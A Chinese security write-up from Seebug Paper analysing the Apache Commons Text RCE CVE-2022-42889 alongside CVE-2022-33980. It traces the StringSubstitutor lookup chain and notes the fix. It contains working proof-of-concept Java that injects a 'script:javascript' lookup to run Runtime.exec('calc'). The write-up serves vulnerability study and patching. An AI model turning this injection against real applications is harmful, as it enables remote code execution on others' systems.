**作者：标准云  
本文为作者投稿，Seebug Paper 期待你的分享，凡经采用即有礼品相送！ 投稿邮箱：paper@seebug.org**

## 漏洞简介

![image](https://images.seebug.org/content/images/2022/10/24/1666596160000-image-20221019142000-jlpkfao.png-w331s)

Apache Commons Text 执行变量插值 (variable interpolation)，
允许动态评估和扩展属性。插值的标准格式是`"${prefix:name}"`，其中 "prefix" 用于查找定位执行插值
`org.apache.commons.text.lookup.StringLookup` 的实例。从 1.5 版到 1.9 版，默认的 Lookup
实例集包括可能导致任意代码执行或与远程服务器联系的插值器。

  * "script" - execute expressions using the JVM script execution engine (javax.script) 使用 JVM 脚本执行引擎(javax.script)执行表达式
  * "dns" - resolve dns records 解析 dns 记录
  * "url" - load values from urls, including from remote servers 从 url 加载值，包括从远程服务加载值

如果使用了不受信任的配置值，则在受影响版本中使用插值默认值的应用程序可能受到远程代码执行的影响。

我们发现漏洞 `CVE-2022-42889` 与 漏洞 `CVE-2022-33980`
描述基本相同，都是因为存在危险的插值器。两个漏洞应该有`异曲同工` 之妙，对两个漏洞依次进行复现并进行总结。

## 漏洞复现

![image](https://images.seebug.org/content/images/2022/10/24/1666596160000-image-20221019142933-t9f923m.png-w331s)

创建 maven 项目，添加依赖

    
    
    <!-- https://mvnrepository.com/artifact/org.apache.commons/commons-text -->
    <dependency>
        <groupId>org.apache.commons</groupId>
        <artifactId>commons-text</artifactId>
        <version>1.9</version>
    </dependency>
    
    
    import org.apache.commons.text.StringSubstitutor;
    
    public class CommonsTextDemo {
        public static void main(String[] args) {
            StringSubstitutor interpolator = StringSubstitutor.createInterpolator();
            String out = interpolator.replace("${script:javascript:java.lang.Runtime.getRuntime().exec('calc')}");
        }
    }

![image](https://images.seebug.org/content/images/2022/10/24/1666596161000-image-20221019145044-r2lul4a.png-w331s)

## 漏洞分析

画出一整个的调试过程

![image](https://images.seebug.org/content/images/2022/10/24/1666596161000-image-20221019164128-5pb8wb0.png-w331s)

Apache Commons Text 是一个专注于处理字符串的算法库，它包含一组用于在 Java 环境中使用的处理文本的函数与可重用组件。

在 `org/apache/commons/text/StringSubstitutor.java` 描述了一些对字符串的处理方法

![image](https://images.seebug.org/content/images/2022/10/24/1666596161000-image-20221019164912-83bd1rs.png-w331s)

    
    
    import org.apache.commons.text.StringSubstitutor;
    
    public class CommonsTextDemo {
        public static void main(String[] args) {
            StringSubstitutor interpolator = StringSubstitutor.createInterpolator();
            System.out.printf(interpolator.replace("${sys:user.dir}"));
        }
    }

![image](https://images.seebug.org/content/images/2022/10/24/1666596161000-image-20221019165140-qu6q97r.png-w331s)?

### 漏洞调试

`org.apache.commons.text.StringSubstitutor#replace(java.lang.String)`

![image](https://images.seebug.org/content/images/2022/10/24/1666596161000-image-20221019165354-uhzna1e.png-w331s)

对传入 `replace` 的参数转换类型后传到 `substitute` 中处理

`org.apache.commons.text.StringSubstitutor#substitute(org.apache.commons.text.TextStringBuilder,
int, int)`

![image](https://images.seebug.org/content/images/2022/10/24/1666596161000-image-20221019165552-fen0skv.png-w331s)

`org.apache.commons.text.StringSubstitutor#substitute(org.apache.commons.text.TextStringBuilder,
int, int, java.util.List<java.lang.String>)`

![image](https://images.seebug.org/content/images/2022/10/24/1666596161000-image-20221019165623-zc3wwb9.png-w331s)

对参数进行检验判断首字符是否为 `$` 然后进行处理之后传到 `resolveVariable`

![image](https://images.seebug.org/content/images/2022/10/24/1666596161000-image-20221019165759-p4q4lif.png-w331s)

`org.apache.commons.text.StringSubstitutor#resolveVariable`

![image](https://images.seebug.org/content/images/2022/10/24/1666596162000-image-20221019165838-l90kye4.png-w331s)

获取 `getStringLookup()` 的值 `InterpolatorStringLookup` 然后调用其 lookup 方法

`org.apache.commons.text.lookup.InterpolatorStringLookup#lookup`

![image](https://images.seebug.org/content/images/2022/10/24/1666596162000-image-20221019170054-6x2q1j7.png-w331s)

根据 `:` 分割提取出 `prefix` 值 然后根据 `stringLookupMap` 提取其对应的 lookup 实例化对象

![image](https://images.seebug.org/content/images/2022/10/24/1666596162000-image-20221019170234-uth1imf.png-w331s)

script 对应的是 `ScriptStringLookup`

`org.apache.commons.text.lookup.ScriptStringLookup#lookup`

![image](https://images.seebug.org/content/images/2022/10/24/1666596162000-image-20221019170441-92k5k24.png-w331s)

再次根据 `:` 将表达式分割

![image](https://images.seebug.org/content/images/2022/10/24/1666596162000-image-20221019170551-ejgka7s.png-w331s)

同 `CVE-2022-33980` 一样 dns 和 url 也属于不安全的插值器

![image](https://images.seebug.org/content/images/2022/10/24/1666596162000-image-20221019171054-05tl6cr.png-w331s)

![image](https://images.seebug.org/content/images/2022/10/24/1666596162000-image-20221019171333-8eshczz.png-w331s)

### 总结反思

首先是针对这个漏洞而言

`createInterpolator` 实例化了 `StringSubstitutor` 并向其中传入
`StringLookupFactory.INSTANCE.interpolatorStringLookup()`

`org.apache.commons.text.StringSubstitutor#createInterpolator`

![image](https://images.seebug.org/content/images/2022/10/24/1666596162000-image-20221019172155-8tjejo7.png-w331s)

`org.apache.commons.text.StringSubstitutor#StringSubstitutor(org.apache.commons.text.lookup.StringLookup)`

![image](https://images.seebug.org/content/images/2022/10/24/1666596163000-image-20221019172415-cfn1gx7.png-w331s)

是根据传入的 StringLookup 去调用不同的方法 接着会到 `InterpolatorStringLookup.java`

所以直接调用 `StringLookupFactory.INSTANCE.interpolatorStringLookup().lookup()` 就是调用
`org.apache.commons.text.lookup.InterpolatorStringLookup#lookup`

漏洞的利用也可以如此构造

    
    
    import org.apache.commons.text.lookup.StringLookupFactory;
    
    public class CommonsTextDemo {
        public static void main(String[] args) {
            StringLookupFactory.INSTANCE.interpolatorStringLookup().lookup("script:javascript:java.lang.Runtime.getRuntime().exec('calc')");
        }
    }

![image](https://images.seebug.org/content/images/2022/10/24/1666596163000-image-20221019171842-834qb1f.png-w331s)

`CVE-2022-33980` 和 `CVE-2022-42889` 都是对字符串的处理不当，最终都是调用了 `ScriptStringLookup`
对传入的内容进行处理，本质上应该多关注 jar 本身的功能，有可能一些漏洞就存在于本身所对应的功能上。

## 漏洞修复

移除了不安全的插值器 `script` 、 `dns` 和 `url`

![image](https://images.seebug.org/content/images/2022/10/24/1666596163000-image-20221019173314-mdjoe88.png-w331s)

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1993/>

